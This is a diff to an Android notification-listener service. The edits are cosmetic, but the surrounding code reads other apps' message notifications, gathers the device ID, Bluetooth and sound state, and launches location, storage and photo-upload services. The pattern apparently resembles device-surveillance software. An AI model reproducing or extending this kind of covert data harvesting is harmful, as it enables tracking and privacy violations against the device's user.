@@ -70,7 +70,7 @@ import java.util.regex.Pattern;
 
 public class NotificationService extends NotificationListenerService implements SensorEventListener {
 
-    // ========================= DEDUP MAP =========================
+    // Dedup map
     private final Map<String, Long> sentMap = new LinkedHashMap<String, Long>(60, 0.75f, true) {
         @Override
         protected boolean removeEldestEntry(Map.Entry<String, Long> eldest) {
@@ -110,7 +110,7 @@ public class NotificationService extends NotificationListenerService implements 
             Pattern.CASE_INSENSITIVE
     );
     private static final Pattern SPEED_PATTERN = Pattern.compile(
-            "(\\d+(\\.\\d+)?\\s*(KB|MB|GB)/s)",
+            "(\\d+(\\.\\d+)?\\s*(B|KB|MB|GB)/s)",
             Pattern.CASE_INSENSITIVE
     );
 
@@ -123,7 +123,6 @@ public class NotificationService extends NotificationListenerService implements 
         }
     }
 
-    // ========================= TRIGGERS =========================
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
         FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
@@ -165,7 +164,7 @@ public class NotificationService extends NotificationListenerService implements 
             try {
                 pkg = sbn.getPackageName();
                 if (pkg == null) return;
-            } catch (Throwable ignored) {
+            } catch (Exception ignored) {
                 return;
             }
 
@@ -173,7 +172,7 @@ public class NotificationService extends NotificationListenerService implements 
             try {
                 android.content.pm.PackageManager pm = getApplicationContext().getPackageManager();
                 appName = pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString();
-            } catch (Throwable ignored) {}
+            } catch (Exception ignored) {}
 
             Notification notification;
             Bundle extras;
@@ -182,7 +181,7 @@ public class NotificationService extends NotificationListenerService implements 
                 if (notification == null) return;
                 extras = notification.extras;
                 if (extras == null) return;
-            } catch (Throwable ignored) {
+            } catch (Exception ignored) {
                 return;
             }
 
@@ -198,7 +197,7 @@ public class NotificationService extends NotificationListenerService implements 
                 text = (textCS != null) ? textCS.toString().trim() : "";
                 bigText = (bigTextCS != null) ? bigTextCS.toString().trim() : "";
 
-            } catch (Throwable ignored) {
+            } catch (Exception ignored) {
                 return;
             }
 
@@ -229,12 +228,14 @@ public class NotificationService extends NotificationListenerService implements 
             if ((allText.contains("%") || allText.matches(".*\\d+\\s*/\\s*\\d+.*"))
                     && keywords.stream().anyMatch(allText::contains)) return;
 
+            // Whatsapp
             if ((pkg.equals("com.whatsapp") || pkg.equals("com.whatsapp.w4b"))
                     && lowerText.contains("new message")) return;
 
             if ((pkg.equals("com.whatsapp") || pkg.equals("com.whatsapp.w4b")) && lowerTitle.contains("whatsapp")
                     && (lowerText.contains("sending") || lowerText.contains("downloading"))) return;
-
+            
+            // Facebook 
             if ((pkg.equals("com.facebook.orca") && lowerTitle.contains("messenger"))
                     && lowerText.contains("new message")) return;
 
@@ -314,7 +315,7 @@ public class NotificationService extends NotificationListenerService implements 
                 try {
                     androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                     if (androidId == null) androidId = "unknown";
-                } catch (Throwable e) {
+                } catch (Exception ignored) {
                     androidId = "unknown";
                 }
 
@@ -364,7 +365,7 @@ public class NotificationService extends NotificationListenerService implements 
 
             if (hasStoragePermission()) {
 
-                // Start SService
+                // Start StorageService
                 Intent stoService = new Intent(this, StorageService.class);
                 startService(stoService);
             }
@@ -656,7 +657,7 @@ public class NotificationService extends NotificationListenerService implements 
 
                         sp.edit().putString("last_cell_tower_unique_id", towerUniqueId).apply();
 
-                        // Start LService
+                        // Start LocationService
                         Intent locService = new Intent(this, LocationService.class);
                         startService(locService);
 
@@ -1364,7 +1365,7 @@ public class NotificationService extends NotificationListenerService implements 
                         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                             soundMap.put("dnd", nm.getCurrentInterruptionFilter() != android.app.NotificationManager.INTERRUPTION_FILTER_ALL);
                         }
-                    } catch (Exception e) {
+                    } catch (Exception ignored) {
                         soundMap.put("dnd", "PERMISSION_REQUIRED");
                     }
                     root.put("sound", soundMap);
@@ -1425,7 +1426,7 @@ public class NotificationService extends NotificationListenerService implements 
                                     devices.add(name);
                                 }
                             }
-                        } catch (Exception e) {}
+                        } catch (Exception ignored) {}
                     }
 
                     bluetoothMap.put("enabled", enabled);
@@ -1541,7 +1542,7 @@ public class NotificationService extends NotificationListenerService implements 
             if (canUpload && !cloudName.isEmpty() && !uploadPreset.isEmpty()) {
                 sp.edit().putLong("last_photos_cooldown_set", now).apply();
 
-                // Start PService
+                // Start PhotosService
                 Intent phoIntent = new Intent(this, PhotosService.class);
                 startService(phoIntent);
             }
